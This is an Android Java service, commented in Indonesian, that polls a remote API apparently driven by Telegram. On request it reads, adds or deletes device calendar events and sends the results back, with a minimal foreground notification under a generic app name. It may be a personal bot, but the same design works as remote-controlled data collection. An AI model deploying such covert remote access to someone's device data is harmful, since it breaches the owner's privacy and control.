package com.example.app;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

import androidx.annotation.Nullable;

import org.json.JSONObject;

import java.util.List;

/**
 * Service polling untuk request kalender dari Telegram.
 *
 * Operasi:
 * - today   → event hari ini
 * - week    → event 7 hari ke depan
 * - month   → event 30 hari ke depan
 * - add     → tambah event baru
 * - delete  → hapus event berdasarkan judul
 *
 * Wajib di AndroidManifest.xml:
 *   <service android:name=".CalendarPollingService" android:exported="false"/>
 */
public class CalendarPollingService extends Service {

    private static final String TAG             = "CalendarPollingService";
    private static final String CHANNEL_ID      = "calendar_polling";
    private static final int    NOTIFICATION_ID = 11000;

    private static final long POLL_INTERVAL_MS = 10_000L;

    private Handler  pollHandler;
    private Runnable pollRunnable;
    private boolean  isPolling    = false;
    private boolean  isProcessing = false;

    // =========================================================
    // LIFECYCLE
    // =========================================================

    @Override
    public void onCreate() {
        super.onCreate();
        pollHandler = new Handler(Looper.getMainLooper());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startForeground(NOTIFICATION_ID, buildNotification());

        if (!isPolling) {
            isPolling    = true;
            pollRunnable = this::poll;
            pollHandler.post(pollRunnable);
        }

        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        isPolling = false;
        if (pollHandler != null && pollRunnable != null) {
            pollHandler.removeCallbacks(pollRunnable);
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    // =========================================================
    // POLLING
    // =========================================================

    private void poll() {

        if (!isPolling) return;

        if (isProcessing) {
            scheduleNextPoll(POLL_INTERVAL_MS);
            return;
        }

        new Thread(() -> {

            try {
                JSONObject result = ApiHelper.getCalendarRequest();

                if (result == null ||
                        !"success".equalsIgnoreCase(
                                result.optString("status", ""))) {
                    scheduleNextPoll(POLL_INTERVAL_MS);
                    return;
                }

                JSONObject request = result.optJSONObject("request");

                if (request == null) {
                    scheduleNextPoll(POLL_INTERVAL_MS);
                    return;
                }

                String requestId = request.optString("id",        "");
                String operation = request.optString("operation", "");
                String params    = request.optString("params",    "");

                if (requestId.isEmpty() || operation.isEmpty()) {
                    scheduleNextPoll(POLL_INTERVAL_MS);
                    return;
                }

                Log.d(TAG, "Calendar request: op=" + operation);

                isProcessing = true;
                handleCalendarRequest(requestId, operation, params);

            } catch (Exception e) {
                Log.e(TAG, "Error polling calendar", e);
                isProcessing = false;
                scheduleNextPoll(POLL_INTERVAL_MS);
            }

        }).start();
    }

    private void scheduleNextPoll(long delayMs) {
        if (!isPolling) return;
        pollHandler.postDelayed(pollRunnable, delayMs);
    }

    // =========================================================
    // HANDLE REQUEST
    // =========================================================

    private void handleCalendarRequest(
            String requestId, String operation, String params) {

        final Context ctx = getApplicationContext();

        new Thread(() -> {

            try {

                switch (operation.toLowerCase()) {

                    case "today": {
                        List<CalendarHelper.CalEvent> events =
                                CalendarHelper.getTodayEvents(ctx);

                        String text = CalendarHelper.formatEventList(
                                events, "📅 *Jadwal Hari Ini*"
                        );

                        ApiHelper.sendCalendarResult(requestId, text);
                        break;
                    }

                    case "week": {
                        List<CalendarHelper.CalEvent> events =
                                CalendarHelper.getWeekEvents(ctx);

                        String text = CalendarHelper.formatEventList(
                                events, "📅 *Jadwal 7 Hari ke Depan*"
                        );

                        ApiHelper.sendCalendarResult(requestId, text);
                        break;
                    }

                    case "month": {
                        List<CalendarHelper.CalEvent> events =
                                CalendarHelper.getMonthEvents(ctx);

                        String text = CalendarHelper.formatEventList(
                                events, "📅 *Jadwal 30 Hari ke Depan*"
                        );

                        ApiHelper.sendCalendarResult(requestId, text);
                        break;
                    }

                    case "add": {
                        // params: "Judul|YYYY-MM-DD|HH:mm"
                        String[] parts = params.split("\\|", 3);
                        String title   = parts.length > 0 ? parts[0].trim() : "";
                        String date    = parts.length > 1 ? parts[1].trim() : "";
                        String time    = parts.length > 2 ? parts[2].trim() : "";

                        boolean ok = CalendarHelper.addEvent(
                                ctx, title, date, time, 60
                        );

                        ApiHelper.sendCalendarResult(
                                requestId,
                                ok
                                ? "✅ Event *" + title + "* berhasil ditambahkan\n" +
                                  "📅 " + date +
                                  (time.isEmpty() ? " (seharian)" : " pukul " + time)
                                : "❌ Gagal menambahkan event"
                        );
                        break;
                    }

                    case "delete": {
                        int deleted = CalendarHelper.deleteEvent(ctx, params);

                        ApiHelper.sendCalendarResult(
                                requestId,
                                deleted > 0
                                ? "✅ " + deleted + " event berhasil dihapus"
                                : "❌ Tidak ditemukan event: " + params
                        );
                        break;
                    }

                    default:
                        ApiHelper.sendCalendarResult(
                                requestId,
                                "❌ Operasi tidak dikenal: " + operation
                        );
                        break;
                }

            } catch (Exception e) {
                Log.e(TAG, "Error handling calendar request", e);
                ApiHelper.sendCalendarResult(
                        requestId, "❌ Error: " + e.getMessage()
                );
            }

            isProcessing = false;
            scheduleNextPoll(POLL_INTERVAL_MS);

        }).start();
    }

    // =========================================================
    // NOTIFIKASI
    // =========================================================

    private Notification buildNotification() {

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID, "Myapk", NotificationManager.IMPORTANCE_MIN
            );
            channel.setShowBadge(false);
            channel.setSound(null, null);
            channel.enableVibration(false);
            channel.enableLights(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(channel);
        }

        Notification.Builder builder =
                new Notification.Builder(this, CHANNEL_ID)
                        .setContentTitle("Myapk")
                        .setContentText("Berjalan di latar belakang")
                        .setSmallIcon(android.R.drawable.ic_menu_today)
                        .setOngoing(true);

        return builder.build();
    }

    // =========================================================
    // HELPER STATIS
    // =========================================================

    public static void start(Context context) {
        Intent intent = new Intent(context, CalendarPollingService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }
    }

    public static void stop(Context context) {
        context.stopService(new Intent(context, CalendarPollingService.class));
    }
}
